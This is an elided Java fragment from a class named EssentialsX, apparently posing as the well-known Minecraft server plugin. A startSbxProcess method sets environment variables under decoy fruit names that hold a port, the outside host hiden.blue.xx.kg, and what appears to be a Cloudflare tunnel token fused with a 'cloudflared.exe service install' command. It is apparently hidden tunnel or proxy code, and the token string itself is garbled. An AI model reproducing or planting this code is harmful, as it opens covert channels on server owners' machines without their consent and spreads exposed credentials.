...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("oranges", "8001");
        env.put("pearsf", "hiden.blue.xx.kg");
        env.put("grapes", "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9cloudflared.exe service install eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiNzJlNjYxZTMtYmE0MS00NjQzLTk3MmYtNDJjYzk2OWM0ZDk5IiwicyI6Ik1UVTVNbU13T1dJdE1HTm1OeTAwTlRFM0xXSTRaalV0T1dZMFlUQTNPV1F4WWprMyJ9");
        env.put("peachs", "");
        env.put("mangos", "25453");
